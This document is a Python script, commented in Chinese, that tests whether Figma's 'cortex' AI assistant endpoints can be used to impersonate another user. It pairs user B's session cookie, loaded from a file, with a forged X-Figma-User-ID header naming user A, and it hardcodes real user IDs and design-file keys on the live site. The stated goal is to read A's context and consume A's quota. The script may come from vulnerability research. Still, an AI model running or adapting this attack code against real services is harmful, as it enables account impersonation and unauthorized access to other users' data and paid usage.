# -*- coding: utf-8 -*-
"""cortex 身份伪造探测: B cookie + X-Figma-User-ID=A 头
若 cortex 不校验 header↔cookie 绑定 → B 可伪装 A 调用 AI 端点 (读 A 上下文/耗 A 额度)
对照: B header=B / 匿名 header=A / 无 header
"""
import io, json, sys, urllib.error, urllib.request
sys.stdout.reconfigure(encoding='utf-8', errors='replace')

BASE = "https://www.figma.com"
A_UID = "1666382703778278399"
B_UID = "1667396392129259941"
A_DESIGN = "5Gs4PaTz11Hlk2sqVnidBG"
PUBLIC = "bv2nMIdFf4u3dESGail4sm"
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/151.0.0.0 Safari/537.36"
BC = io.open('ws_cookie_B_new.txt', encoding='utf-8').read().strip().replace('\n', '; ')

def call(label, path, method='POST', body=None, cookie=BC, uid=None, file_key=None, extra=None):
    url = BASE + path
    headers = {"User-Agent": UA, "Content-Type": "application/json",
               "Origin": "https://www.figma.com", "Referer": "https://www.figma.com/"}
    if cookie:
        headers["Cookie"] = cookie
    if uid:
        headers["X-Figma-User-ID"] = uid
    if file_key:
        headers["X-Figma-File-Key"] = file_key
    if extra:
        headers.update(extra)
    req = urllib.request.Request(url, method=method, headers=headers)
    if body is not None:
        req.data = json.dumps(body).encode()
    try:
        r = urllib.request.urlopen(req, timeout=25)
        b = r.read().decode(errors='replace')
        print(f"[{label}] {method} {path} → {r.status} {b[:300]}")
    except urllib.error.HTTPError as e:
        b = e.read().decode(errors='replace')
        print(f"[{label}] {method} {path} → {e.code} {b[:300]}")
    except Exception as e:
        print(f"[{label}] {method} {path} → ❌ {type(e).__name__}: {str(e)[:120]}")

print("======== A. suggest_prompts: B cookie + claim A 头 ========")
call("B+claimA", "/api/cortex/assistant/suggest_prompts",
     body={"fileKey": A_DESIGN, "prompt": "hello"}, uid=A_UID, file_key=A_DESIGN)
call("B+claimA 公开", "/api/cortex/assistant/suggest_prompts",
     body={"fileKey": PUBLIC, "prompt": "hello"}, uid=A_UID, file_key=PUBLIC)

print("\n======== B. 对照: B cookie + claim B 头 ========")
call("B+claimB", "/api/cortex/assistant/suggest_prompts",
     body={"fileKey": A_DESIGN, "prompt": "hello"}, uid=B_UID, file_key=A_DESIGN)

print("\n======== C. 匿名 + claim A 头 ========")
call("anon+claimA", "/api/cortex/assistant/suggest_prompts",
     body={"fileKey": A_DESIGN, "prompt": "hello"}, cookie=None, uid=A_UID, file_key=A_DESIGN)

print("\n======== D. find_relevant_ds_assets: B cookie + claim A ========")
call("B+claimA ds", "/api/cortex/assistant/find_relevant_ds_assets",
     body={"fileKey": A_DESIGN, "query": "button"}, uid=A_UID, file_key=A_DESIGN)
call("B+claimB ds", "/api/cortex/assistant/find_relevant_ds_assets",
     body={"fileKey": A_DESIGN, "query": "button"}, uid=B_UID, file_key=A_DESIGN)
